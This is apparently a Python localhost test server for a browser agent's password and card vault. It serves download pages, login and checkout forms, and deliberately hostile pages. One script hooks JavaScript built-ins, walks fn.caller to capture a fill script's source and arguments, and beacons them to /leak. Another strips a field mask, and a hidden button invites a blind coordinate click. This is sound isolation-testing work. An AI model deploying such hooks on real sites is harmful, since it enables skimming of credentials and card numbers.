"""Download site for the browser check (default.nix): pages that start downloads by a link, a form
POST answered with an attachment, a form POST answered with a 302 to a file on
another origin (APKSum's shape), and a script-built blob; plus a fetch() re-POST
of the redirecting form and a file over browser_downloads' 50 MiB limit. /login is
a login form for the vault test, /signup a signup form (password and confirmation).
Card checkouts for the vault's hosted card-field fill: /card is a processor's card
frame (number, expiry, CVC); /checkout embeds it from http://localhost:<card port>
(the stand-in processor origin), /checkout-evil embeds the same frame from
http://localhost:<this port> (an origin the shop controls, not a processor),
/checkout-nested embeds the processor frame inside /wrap from that origin.
The card port is the second argument (default 8767).
Hostile pages for the vault's isolation (any page code, attacker or XSS): /card-hostile
is the card frame with every built-in a fill script could call hooked (Array.from,
JSON.stringify, Object.keys, Function.prototype.call/toString, Array.prototype.*, DOM
methods) and walking fn.caller from each hook; /checkout-hostile embeds it from the
processor origin, /login-hostile is the login form with the same hooks. Each hook hit
is sent to /leak on the serving origin; GET /leaks returns them (JSON) and clears them.
A hosted checkout for the whole purchase (checkout.py): /checkout-hosted on the shop embeds
/hosted-card from the processor origin (Stripe-style card fields, a card preview that mirrors
the number as the page's own text, and a Pay button that POSTs them to /pay on the processor), which itself embeds two cross-origin frames: /agree from
http://127.0.0.1:<card port> (an "I agree" button and a "Confirm" button at a fixed spot, for a
ref click and a coordinate click) and the captcha (http://127.0.0.1:8766/captcha). Fixed layout:
the Confirm button's centre is at (200, 220) of the viewport. Every action lands in GET /events
(JSON, cleared on read) on the origin that served it; /pay records the posted fields.

/actions (actions.py): controls with no ref (divs with click handlers), two identical "Select"
entries, a status that shows 1.5 s after a click, a one-time-code box and a button to /actions-done.

Files are deterministic bytes; `site.py --sha <name>` prints a file's sha256.
"""
import hashlib
import json
import socket
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def payload(name: str, size: int) -> bytes:
    seed = hashlib.sha256(name.encode()).digest()
    out = bytearray()
    block = seed
    while len(out) < size:
        block = hashlib.sha256(block).digest()
        out += block
    return bytes(out[:size])


FILES = {
    "link.bin": 300_000,
    "form.bin": 1_234_567,
    "js.bin": 77_777,
    "redirect.bin": 1_678_318,
}
BIG = 60 * 1024 * 1024  # over the 50 MiB save limit

INDEX = b"""<!doctype html><html><head><title>downloads</title></head><body>
<h1>Downloads</h1>
<a id="link" href="/files/link.bin">Direct link download</a>
<form id="f" method="post" action="/submit">
  <input type="hidden" name="token" value="abc123">
  <button id="formbtn" type="submit">Form download</button>
</form>
<form id="f2" method="post" action="/submit-redirect">
  <input type="hidden" name="token" value="abc123">
  <button id="redirbtn" type="submit">Redirect form download</button>
</form>
<button id="jsbtn" onclick="go()">JS download</button>
<button id="fetchbtn" onclick="refetch()">Fetch re-POST</button>
<p id="fetchresult">none</p>
<a id="big" href="/files/big.bin">Big download</a>
<script>
async function go() {
  const r = await fetch('/raw/js.bin');
  const b = await r.blob();
  const a = document.createElement('a');
  a.href = URL.createObjectURL(b);
  a.download = 'js.bin';
  document.body.appendChild(a);
  a.click();
}
async function refetch() {
  const el = document.getElementById('fetchresult');
  try {
    const r = await fetch('/submit-redirect', {method: 'POST', body: new URLSearchParams(new FormData(document.getElementById('f2'))), credentials: 'include'});
    el.textContent = 'status ' + r.status;
  } catch (e) {
    el.textContent = 'err ' + e;
  }
}
</script>
</body></html>"""

LOGIN = b"""<!doctype html><html><head><title>login</title></head><body>
<form method="post" action="/login">
  <label>Username <input id="user" name="username" autocomplete="username"></label>
  <label>Password <input id="pw" name="password" type="password" autocomplete="current-password"></label>
  <button type="submit">Sign in</button>
</form>
</body></html>"""

SIGNUP = b"""<!doctype html><html><head><title>sign up</title></head><body>
<form method="post" action="/signup">
  <label>Email <input id="email" name="email" type="email" autocomplete="email"></label>
  <label>Password <input id="pw" name="password" type="password"></label>
  <label>Confirm password <input id="pw2" name="confirm" type="password"></label>
  <button type="submit">Create account</button>
</form>
</body></html>"""

CARD = b"""<!doctype html><html><head><title>card</title></head><body>
<input id="number" name="cardnumber" autocomplete="cc-number" inputmode="numeric">
<input id="expiry" name="exp-date" autocomplete="cc-exp">
<input id="cvc" name="cvc" autocomplete="cc-csc">
</body></html>"""


# Page code that hunts for a vault script: hooks walk .caller and report its source (and their arguments).
HOOKS = br"""<script>
(() => {
  const realToString = Function.prototype.toString, realStringify = JSON.stringify, realApply = Reflect.apply;
  let busy = false;
  const send = (what) => { const i = new Image(); i.src = '/leak?d=' + encodeURIComponent(String(what).slice(0, 4000)); };
  function record(name, hook, args) {
    if (busy) return; busy = true;
    try {
      let fn = null; try { fn = hook.caller; } catch (e) {}
      for (let d = 0; fn && d < 12; d++) { try { send(name + ' caller: ' + realToString.call(fn)); } catch (e) {} try { fn = fn.caller; } catch (e) { break; } }
      try { send(name + ' args: ' + realStringify(Array.prototype.slice.call(args))); } catch (e) {}
    } finally { busy = false; }
  }
  const hookIt = (owner, key, label) => {
    const real = owner[key]; if (typeof real !== 'function') return;
    const hook = function hook() { record(label, hook, arguments); return realApply(real, this, arguments); };
    try { Object.defineProperty(owner, key, { value: hook, writable: true, configurable: true }); } catch (e) {}
  };
  for (const k of ['from', 'isArray']) hookIt(Array, k, 'Array.' + k);
  for (const k of ['stringify', 'parse']) hookIt(JSON, k, 'JSON.' + k);
  for (const k of ['keys', 'getOwnPropertyDescriptor', 'assign']) hookIt(Object, k, 'Object.' + k);
  for (const k of ['join', 'map', 'flatMap', 'forEach', 'filter', 'find', 'some', 'push', 'indexOf', 'includes']) hookIt(Array.prototype, k, 'Array.prototype.' + k);
  for (const k of ['startsWith', 'trim', 'toLowerCase', 'replace']) hookIt(String.prototype, k, 'String.prototype.' + k);
  for (const k of ['call', 'apply', 'toString']) hookIt(Function.prototype, k, 'Function.prototype.' + k);
  for (const k of ['querySelectorAll', 'getAttribute', 'setAttribute', 'removeAttribute', 'dispatchEvent', 'focus']) {
    for (const owner of [Document.prototype, Element.prototype, EventTarget.prototype, HTMLElement.prototype]) hookIt(owner, k, k);
  }
  window.hermesPageMarker = 'page-world';
  // Control: the page's own sloppy call is caught, so the beacon path works.
  (function control() { const marker = 'hook-control-marker'; Array.from([marker]); })();
})();
</script>"""

CARD_HOSTILE = CARD.replace(b"<head>", b"<head>" + HOOKS)
LOGIN_HOSTILE = LOGIN.replace(b"<head>", b"<head>" + HOOKS)
LEAKS: list[str] = []
EVENTS: list[dict] = []
CAPTCHA_URL = "http://127.0.0.1:8766/captcha"

CHECKOUT_HOSTED = """<!doctype html><html><head><title>hosted checkout</title><style>
body {{ margin: 0; font-family: sans-serif; }}
/* a root narrower than the viewport: the mask's screenshot scale must not be read off it */
html {{ max-width: 1000px; }}
#ref {{ position: absolute; left: 720px; top: 10px; width: 300px; font-size: 22px; }}
#card {{ position: absolute; left: 0; top: 60px; width: 700px; height: 680px; border: 0; }}
</style></head><body>
<label>Reference <input id="ref" name="reference"></label>
<iframe id="card" src="{card}"></iframe>
</body></html>"""

HOSTED_CARD = """<!doctype html><html><head><title>card</title><style>
body {{ margin: 0; font-family: sans-serif; }}
input {{ font-size: 22px; width: 220px; }}
#agree {{ position: absolute; left: 0; top: 100px; width: 300px; height: 100px; border: 0; }}
#cap {{ position: absolute; left: 0; top: 200px; width: 400px; height: 470px; border: 0; }}
</style></head><body>
<div id="preview" style="position: absolute; left: 320px; top: 60px; font-size: 22px;">•••• •••• •••• ••••</div>
<div id="groups" style="position: absolute; left: 320px; top: 100px; font-size: 22px;"></div>
<form method="post" action="/pay">
<input id="number" name="cardnumber" autocomplete="cc-number" inputmode="numeric" aria-label="Card number"
  oninput="document.getElementById('preview').textContent = this.value.replace(/(\\d{{4}})(?=\\d)/g, '$1 ');
           document.getElementById('groups').innerHTML = (this.value.match(/\\d{{1,4}}/g) || []).map((g) => '<span>' + g + '</span>').join(' ')">
<input id="expiry" name="exp-date" autocomplete="cc-exp" aria-label="Expiry">
<input id="cvc" name="cvc" autocomplete="cc-csc" aria-label="CVC">
<button type="submit">Pay</button>
</form>
<iframe id="agree" src="{agree}"></iframe>
<iframe id="cap" src="{captcha}"></iframe>
<script>
// hostile page code (checkout.py's fail-closed step): strip the mask's style whenever it is set
window.stripMask = () => {{
  const n = document.getElementById('number');
  new MutationObserver(() => {{ if (n.hasAttribute('data-hermes-vault-mask')) n.removeAttribute('style'); }})
    .observe(n, {{ attributes: true }});
  return 1;
}};
</script>
</body></html>"""

AGREE = b"""<!doctype html><html><head><title>agree</title><style>
body { margin: 0; font-family: sans-serif; }
#ok { position: absolute; left: 0; top: 0; }
#confirm { position: absolute; left: 150px; top: 40px; width: 100px; height: 40px; }
</style></head><body>
<button id="ok" onclick="fetch('/event?e=agreed')">I agree</button>
<button id="confirm" tabindex="-1" aria-hidden="true" onclick="fetch('/event?e=confirmed')"></button>
</body></html>"""


# The agent-action tools (actions.py): controls without a role (divs with click handlers: no ref),
# a list of identical "Select" entries, a status that appears 1.5 s after a click, a one-time-code
# box, a button that navigates.
ACTIONS = b"""<!doctype html><html><head><title>actions</title></head><body>
<h1>Actions</h1>
<div class="tab" onclick="document.getElementById('panel').textContent='Panel two open'">Second tab</div>
<p id="panel">Panel one open</p>
<ul>
<li><span>Morning flight</span> <div class="pick" onclick="pick('morning')">Select</div></li>
<li><span>Evening flight</span> <div class="pick" onclick="pick('evening')">Select</div></li>
</ul>
<p id="picked">nothing picked</p>
<button onclick="setTimeout(() => { document.getElementById('late').textContent = 'Change confirmed'; }, 1500)">Confirm change</button>
<p id="late"></p>
<label>Code <input id="code" maxlength="6" autocomplete="one-time-code"></label>
<button onclick="location.href='/actions-done'">Continue</button>
<script>
function pick(which) { document.getElementById('picked').textContent = 'picked ' + which; fetch('/event?e=picked-' + which); }
</script>
</body></html>"""

ACTIONS_DONE = b"""<!doctype html><html><head><title>done</title></head><body><h1>All done</h1></body></html>"""


def checkout(frame_url: str) -> bytes:
    return ('<!doctype html><html><head><title>checkout</title></head><body>\n'
            '<label>Email <input id="email" type="email" autocomplete="email"></label>\n'
            f'<iframe id="card" src="{frame_url}" width="400" height="200"></iframe>\n'
            # any page script may move the card frame (the navigation race)
            "<script>window.hijack = (to) => { document.getElementById('card').src = to; };</script>\n"
            '</body></html>').encode()


def wrap(frame_url: str) -> bytes:
    return b'<!doctype html><html><body><iframe src="' + frame_url.encode() + b'" width="380" height="180"></iframe></body></html>'


class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("site: " + fmt % args + "\n")

    def _file(self, name, data, attach=True):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        if attach:
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(INDEX)))
            self.end_headers()
            self.wfile.write(INDEX)
        elif self.path in ("/actions", "/actions-done"):
            page = ACTIONS if self.path == "/actions" else ACTIONS_DONE
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path in ("/login", "/signup"):
            page = LOGIN if self.path == "/login" else SIGNUP
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path.startswith("/leak?"):
            from urllib.parse import parse_qs, urlsplit
            LEAKS.append(parse_qs(urlsplit(self.path).query).get("d", [""])[0])
            self.send_response(204)
            self.end_headers()
        elif self.path.startswith("/event?"):
            from urllib.parse import parse_qs, urlsplit
            EVENTS.append({"event": parse_qs(urlsplit(self.path).query).get("e", [""])[0]})
            self.send_response(204)
            self.end_headers()
        elif self.path in ("/events", "/checkout-hosted", "/hosted-card", "/agree"):
            port = self.server.server_address[1]
            if self.path == "/events":
                page, ctype = json.dumps(EVENTS).encode(), "application/json"
                EVENTS.clear()
            else:
                ctype = "text/html"
                page = {"/checkout-hosted": lambda: CHECKOUT_HOSTED.format(card=f"http://localhost:{CARD_PORT}/hosted-card").encode(),
                        "/hosted-card": lambda: HOSTED_CARD.format(agree=f"http://127.0.0.1:{port}/agree",
                                                                   captcha=CAPTCHA_URL).encode(),
                        "/agree": lambda: AGREE}[self.path]()
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path == "/leaks":
            body = json.dumps(LEAKS).encode()
            LEAKS.clear()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path in ("/card", "/checkout", "/checkout-evil", "/checkout-nested", "/wrap", "/card-hostile",
                           "/checkout-hostile", "/login-hostile"):
            port = self.server.server_address[1]
            processor = f"http://localhost:{CARD_PORT}/card"
            page = {"/card": CARD, "/checkout": checkout(processor),
                    "/checkout-evil": checkout(f"http://localhost:{port}/card"),
                    "/checkout-nested": checkout(f"http://localhost:{port}/wrap"),
                    "/wrap": wrap(processor), "/card-hostile": CARD_HOSTILE,
                    "/checkout-hostile": checkout(processor + "-hostile"),
                    "/login-hostile": LOGIN_HOSTILE}[self.path]
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path == "/files/big.bin":
            self._file("big.bin", payload("big.bin", BIG))
        elif self.path.startswith("/files/") and self.path[7:] in FILES:
            n = self.path[7:]
            self._file(n, payload(n, FILES[n]))
        elif self.path.startswith("/raw/") and self.path[5:] in FILES:
            n = self.path[5:]
            self._file(n, payload(n, FILES[n]), attach=False)
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length)
        if self.path == "/pay":
            from urllib.parse import parse_qs
            EVENTS.append({"event": "paid", "fields": {k: v[0] for k, v in parse_qs(body.decode()).items()}})
            page = b"<!doctype html><html><body><p>Payment received</p></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path == "/submit-redirect" and b"token=abc123" in body:
            # Like APKSum: the POST answers 302 to a file on another origin.
            port = self.server.server_address[1]
            self.send_response(302)
            self.send_header("Location", f"http://localhost:{port}/files/redirect.bin")
            self.send_header("Content-Length", "0")
            self.end_headers()
        elif self.path == "/submit" and b"token=abc123" in body:
            self._file("form.bin", payload("form.bin", FILES["form.bin"]))
        else:
            self.send_error(403)


class DualStack(ThreadingHTTPServer):
    # localhost may resolve to ::1 first, so listen on both families.
    address_family = socket.AF_INET6

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        super().server_bind()


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--sha":
        n = sys.argv[2]
        print(hashlib.sha256(payload(n, BIG if n == "big.bin" else FILES[n])).hexdigest())
        sys.exit(0)
    CARD_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8767
    DualStack(("::", int(sys.argv[1]) if len(sys.argv) > 1 else 8765), H).serve_forever()
